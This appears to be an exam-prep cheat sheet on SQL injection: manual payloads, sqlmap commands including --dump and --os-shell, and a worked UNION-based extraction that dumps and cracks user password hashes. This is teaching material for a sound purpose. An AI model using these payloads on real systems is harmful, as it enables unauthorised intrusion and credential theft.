# 6. SQL Injection

## Core idea
Unsanitized user input becomes part of a SQL query. Goal: bypass auth, extract data (`UNION`), read files, sometimes RCE.

## Manual injection payloads (classic workflow)
```sql
'                          # break the query → SQL error = vulnerable
' OR 1=1 --                # auth bypass (comment kills rest of query)
' OR 1=1 #                 # MySQL comment variant
' OR '1'='1                # without comment
admin' --                 # log in as first user
' UNION SELECT NULL--      # test column count, keep adding NULL until no error
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--     # find which columns display

# Fingerprint DB / extract (MySQL examples)
' UNION SELECT version(),user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```

**Blind SQLi** (no visible output): use `AND SLEEP(5)--` (time-based) or boolean `AND 1=1` vs `AND 1=2` differences.

## sqlmap (the automated hammer)
```bash
# Basic
sqlmap -u "http://target.com/page?id=1" --batch

# POST form (capture request with Burp, save to file)
sqlmap -r request.txt --batch

# Specify the param & method
sqlmap -u "http://target.com/login.php" --data="user=a&pass=b" --batch

# Enumerate databases/tables/columns/dump
sqlmap -u URL --dbs              # list databases
sqlmap -u URL -D mydb --tables   # tables in db
sqlmap -u URL -D mydb -T users --columns
sqlmap -u URL -D mydb -T users --dump     # dump the table
sqlmap -u URL --os-shell          # try interactive OS shell (MySQL FILE privilege)
sqlmap -u URL --passwords         # crack DB user hashes with sqlmap's built-in
sqlmap -u URL -p id --level=3 --risk=2     # more thorough (p = test this param)
sqlmap -u URL --forms              # auto-parse forms on page
sqlmap -u URL --cookie="PHPSESSID=abc123"   # with session
sqlmap -u URL --tamper=space2comment   # evade filters
```

## Browser tools
- **Burp Suite / OWASP ZAP** — intercept requests, Repeater for manual payload testing.
- Save the intercepted request to a file for `sqlmap -r`.
- **sqlmap** against a login page: `--data="username=a&password=b"`.

## Common defense you may be asked about
Parameterized queries / prepared statements, input validation, least-privilege DB users, WAFs, error suppression.

## Worked example — UNION-based extraction end-to-end

> Scenario (typical exam setup): `http://target.com/product.php?id=1` shows a product page.

**Step 1 — Confirm injection with a quote:**
```
http://target.com/product.php?id=1'
```
Page throws a SQL error (`You have an error in your SQL syntax...`) → input reaches the query unsanitized. Vulnerable.

**Step 2 — Find the column count with ORDER BY (or NULL method):**
```
http://target.com/product.php?id=1 ORDER BY 1-- -   ✔ OK
http://target.com/product.php?id=1 ORDER BY 2-- -   ✔ OK
http://target.com/product.php?id=1 ORDER BY 3-- -   ✔ OK
http://target.com/product.php?id=1 ORDER BY 4-- -   ✘ error → query uses 3 columns
```
(Alternative: `' UNION SELECT NULL-- -`, then `NULL,NULL-- -`, adding until no error.)

**Step 3 — Find which columns echo back to the page:**
```
http://target.com/product.php?id=-1 UNION SELECT 1,2,3-- -
```
Note the `id=-1`: the original query must return nothing so OUR row is displayed. Page now shows `2` where a price was and `3` where a description was → columns 2 and 3 are usable.

**Step 4 — Fingerprint the database with the echoing column:**
```
http://target.com/product.php?id=-1 UNION SELECT 1,version(),database()-- -
```
Page shows: `5.7.38` and `webshop` → MySQL 5.7, database `webshop`.

**Step 5 — List the tables in `webshop`:**
```
http://target.com/product.php?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='webshop'-- -
```
Page shows: `products,users,sessions` → `users` looks interesting.

**Step 6 — List `users` columns:**
```
http://target.com/product.php?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
```
Page shows: `id,username,password,role`

**Step 7 — Dump the creds:**
```
http://target.com/product.php?id=-1 UNION SELECT 1,group_concat(username,':',password),3 FROM users-- -
```
Page shows: `admin:5f4dcc3b5aa765d61d8327deb882cf99,jdoe:e10adc3949ba59abbe56e057f20f883e` →
`5f4dcc3b5aa765d61d8327deb882cf99` is 32 hex chars = MD5 (see [08-hash-cheat-table.md](08-hash-cheat-table.md)); crack with `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` → `password`.

**Same attack with sqlmap (much faster on exams):**
```bash
sqlmap -u "http://target.com/product.php?id=1" --batch --dbs
#  back-end DBMS: MySQL >= 5.0 | available databases: [information_schema, webshop]
sqlmap -u "http://target.com/product.php?id=1" --batch -D webshop --tables
#  users, products, sessions
sqlmap -u "http://target.com/product.php?id=1" --batch -D webshop -T users --dump
#  dumps all rows, auto-identifies and cracks MD5 hashes with rockyou
```

**Login-bypass variant (form POSTs to login.php):**
```
Username: ' OR 1=1 -- -
Password: anything
```
Injected query becomes `SELECT * FROM users WHERE user='' OR 1=1 -- ' AND pass='...'` → the password check is commented out and `OR 1=1` matches the first row (usually admin).

## Exam workflow
1. Find input points (login forms, `?id=` URLs).
2. Test with `'` → error? → try `' OR 1=1 --`.
3. If manual is slow → capture request → `sqlmap -r`.
4. Escalate: `--dbs` → `-D -T` → `--dump`.
5. Report what DB/version/table you extracted (they usually ask for a specific flag in the data).

← [Back to index](README.md)
